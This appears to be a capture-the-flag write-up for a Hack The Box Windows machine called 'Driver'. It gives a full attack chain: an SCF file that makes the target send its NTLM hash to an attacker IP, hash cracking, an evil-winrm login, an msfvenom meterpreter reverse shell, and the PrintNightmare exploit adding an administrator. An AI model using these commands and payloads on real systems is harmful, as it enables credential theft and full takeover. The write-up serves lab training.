# Driver Writeup

## Enumeration

### Nmap

First, let's scan for open ports using `nmap`. We can quickly scan for open ports and store them in a variable: `ports=$(nmap -p- --min-rate=1000 -T4 10.10.11.106 | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)`. Then, we can scan those specific ports in depth by running `nmap`'s built-in scripts: `nmap -p$ports -sC -sV 10.10.11.106`.

```
PORT     STATE SERVICE      VERSION
80/tcp   open  http         Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  Basic realm=MFP Firmware Update Center. Please enter password for admin
|_http-server-header: Microsoft-IIS/10.0
135/tcp  open  msrpc        Microsoft Windows RPC
445/tcp  open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
5985/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: Host: DRIVER; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2022-02-19T11:40:18
|_  start_date: 2022-02-19T05:20:32
|_clock-skew: mean: 7h00m02s, deviation: 0s, median: 7h00m02s
```

### Port `80`

Going to the website on port 80 gives an HTTP authentication dialogue box. Using the credentials `admin:admin` to sign in works. There is a `fw_up.php` page where we can upload firmware, but there doesn't seem to be an accessible location where those files get uploaded to.

A directory bruteforce scan reveals nothing: `ffuf -w /usr/share/seclists/Discovery/Web-Content/big.txt -u http://10.10.11.106/FUZZ`.

### Port `5985` (WinRM)

According to [HackTricks](https://book.hacktricks.xyz/pentesting/5985-5986-pentesting-winrm), "Windows Remote Management (WinRM) is a Microsoft protocol that allows remote management of Windows machines over HTTP(S) using SOAP... If WinRM is enabled on the machine, it's trivial to remotely administer the machine from PowerShell. In fact, you can just drop in to a remote PowerShell session on the machine (as if you were using SSH!)"

Under the [WinRM connection in linux](https://book.hacktricks.xyz/pentesting/5985-5986-pentesting-winrm#winrm-connection-in-linux) heading, HackTricks mentions using [Hackplayers/evil-winrm](https://github.com/Hackplayers/evil-winrm). We need to have access credentials to use this protocol.

### Port `135` (Samba)

This leaves one port, `135`, which is for samba. According to [Wikipedia](https://en.wikipedia.org/wiki/Server_Message_Block), "Server Message Block (SMB) is a communication protocol that Microsoft created for providing shared access to files and printers across nodes on a network." Since the other two ports look like dead ends for now, we must be able to find something here. Maybe the files are being uploaded to the samba share, which would mean we have write access to that share without authentication details.

Under this assumption, searching online for "smb unauthenticated write access exploit" reveals [this post about SCF file attacks on SMB](https://pentestlab.blog/2017/12/13/smb-share-scf-file-attacks/). Apparently, if SMB "is configured with write permissions for unauthenticated users then it is possible to obtain passwords hashes of domain users or Meterpreter shells."

On the [HackTricks post about WinRM](https://book.hacktricks.xyz/pentesting/5985-5986-pentesting-winrm#pass-the-hash-with-evil-winrm) there is a subheading called "Pass the hash with evil-winrm." So, if we can get a hash with an SCF attack we can pass the hash and get a user shell with `evil-winrm`.

Searching for "SMB SCF file exploit" shows these additional results: [sql--injection.blogspot.com](https://sql--injection.blogspot.com/p/smb.html) and [1337red.wordpress.com](https://1337red.wordpress.com/using-a-scf-file-to-gather-hashes/).

Essentially, an SCF file is used to control Windows Explorer. So, when a user browses to a folder containing an SCF file, Windows will use the contents of that file. We can create an SCF file like this:

```
[Shell]
Command=2
IconFile=\\X.X.X.X\share\test.ico
[Taskbar]
Command=ToggleDesktop
```

We can set `X.X.X.X` to our attacker's ip address. Since the `IconFile` field is set to a UNC path, Windows will request the icon from the attacker and try authenticating with the user's credentials, then the attack will issue a challenge request, finally Windows will return a challenge response with the NTLM hash.

## Foothold

First, we start [`responder`](https://www.kali.org/tools/responder/) with `sudo responder -w --lm -v -I tun0`.

Then, we upload the following SCF file using the firmware upload page (`fw_up.php`) on port 80.

```
[Shell]
Command=2
IconFile=\\10.10.14.32\share\test.ico
[Taskbar]
Command=ToggleDesktop
```

Responder outputs the following:

```
[SMB] NTLMv2 Client   : ::ffff:10.10.11.106
[SMB] NTLMv2 Username : DRIVER\tony
[SMB] NTLMv2 Hash     : tony::DRIVER:566dd632a8e52118:AA64BDEA4F87F24A42C8CDFA48DF7780:0101000000000000FA685E0C8F25D801E8816037B7647BED00000000020000000000000000000000
```

We have our NTLM hash!

### Cracking the NTLM Hash

We can crack this hash with `hashcat`. We first find the `hashcat` mode needed for NTLMv2 hashes with `hashcat --help | grep NTLMv2`, which shows us the correct mode is `5600`.

So, we paste the hash into a file called `hash` and then run `hashcat` with `hashcat -a 0 -m 5600 hash rockyou.txt`:

```
TONY::DRIVER:566dd632a8e52118:aa64bdea4f87f24a42c8cdfa48df7780:0101000000000000fa685e0c8f25d801e8816037b7647bed00000000020000000000000000000000:liltony
```

The password is `liltony`.

### Evil WinRM

According to [HackTricks](https://book.hacktricks.xyz/pentesting/5985-5986-pentesting-winrm#using-evil-winrm), we can use `evil-winrm` like so: `evil-winrm -u <username> -p <password> -i <IP>`. Let's connect with the `tony` user like so: `evil-winrm -u tony -p liltony -i 10.10.11.106`.

We get a shell on the machine! Now, we can get the `user.txt` flag with `cat ..\Desktop\user.txt`.

## Privilege Escalation

Let's upload [WinPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS) to scan for ways to gain privileges. Since we are using `evil-winrm` we can simply run the `upload` command: `upload /home/kali/Downloads/winPEASx64.exe`. We can run it with `.\winPEASx64.exe`. This doesn't give any easy wins.

To get a metasploit shell run the following on the attacker:

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=tun0 LPORT=4444 -f exe > e.exe
sudo msfconsole
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST tun0
options
run
```

Then, through `evil-winrm` on the target run: `upload e.exe` and then `.\e.exe`.

Then, back in the meterpreter, run `background` to get mack the the `msf` console. Then run `use post/multi/recon/local_exploit_suggester` and set the session with `set session 1` then `run` to get a list of possible exploits. This reveals nothing.

So, the actual exploit that should be used is `CVE-2021-1675`/`CVE-2021-34527`, or PrintNightmare. After enough searching one may find this exploit because the `spoolsv` service is running as shown in WinPEAS's "Current TCP Listening Ports" output (and when simply running `ps`):

```
Protocol   Local Address         Local Port    Remote Address        Remote Port     State             Process ID      Process Name

TCP        0.0.0.0               80            0.0.0.0               0               Listening         4               System
TCP        0.0.0.0               135           0.0.0.0               0               Listening         708             svchost
TCP        0.0.0.0               445           0.0.0.0               0               Listening         4               System
TCP        0.0.0.0               5985          0.0.0.0               0               Listening         4               System
TCP        0.0.0.0               47001         0.0.0.0               0               Listening         4               System
TCP        0.0.0.0               49408         0.0.0.0               0               Listening         464             wininit
TCP        0.0.0.0               49409         0.0.0.0               0               Listening         868             svchost
TCP        0.0.0.0               49410         0.0.0.0               0               Listening         844             svchost
TCP        0.0.0.0               49411         0.0.0.0               0               Listening         1176            spoolsv
TCP        0.0.0.0               49412         0.0.0.0               0               Listening         572             services
TCP        0.0.0.0               49413         0.0.0.0               0               Listening         580             lsass
TCP        10.10.11.106          139           0.0.0.0               0               Listening         4               System
TCP        10.10.11.106          445           10.10.14.78           36684           Established       4               System
TCP        10.10.11.106          5985          10.10.14.32           59202           Time Wait         0               Idle
TCP        10.10.11.106          5985          10.10.14.32           59204           Established       4               System
```

[0xdf's article "Playing with PrintNightmare"](https://0xdf.gitlab.io/2021/07/08/playing-with-printnightmare.html) is a great tutorial on how to exploit this vulnerability. [Invoke-Nightmare](https://github.com/calebstewart/CVE-2021-1675), a PowerShell script developed by Caleb Stewart and John Hammond, is the most simple to use PrintNightmare exploit.

We can [download the exploit](https://raw.githubusercontent.com/calebstewart/CVE-2021-1675/main/CVE-2021-1675.ps1) to our attacker machine with `wget https://raw.githubusercontent.com/calebstewart/CVE-2021-1675/main/CVE-2021-1675.ps1` and then upload it to the target with our `evil-winrm` connection by running `upload CVE-2021-1675.ps1`. Then, run `set-ExecutionPolicy RemoteSigned -Scope CurrentUser` so you don't get the "execution of scripts is disabled on this system" error message ([StackOverflow answer where command was found](https://stackoverflow.com/a/4038991)). Now, we can launch the exploit:

```
Import-Module .\cve-2021-1675.ps1
Invoke-Nightmare -NewUser "john" -NewPassword "SuperSecure"
```

Originally, I saw the `[!] failed to get current driver list` error message, but after resetting the box it worked:

```
[+] created payload at C:\Users\tony\AppData\Local\Temp\nightmare.dll
[+] using pDriverPath = "C:\Windows\System32\DriverStore\FileRepository\ntprint.inf_amd64_f66d9eed7e835e97\Amd64\mxdwdrv.dll"
[+] added user  as local administrator
[+] deleting payload from C:\Users\tony\AppData\Local\Temp\nightmare.dll
```

Now, all we have to do is connect with `evil-winrm` as our newly created administrator `john` user: `evil-winrm -u john -p SuperSecure -i 10.10.11.106`. We can get the `root.txt` flag with `cat C:\Users\Administrator\Desktop\root.txt`.
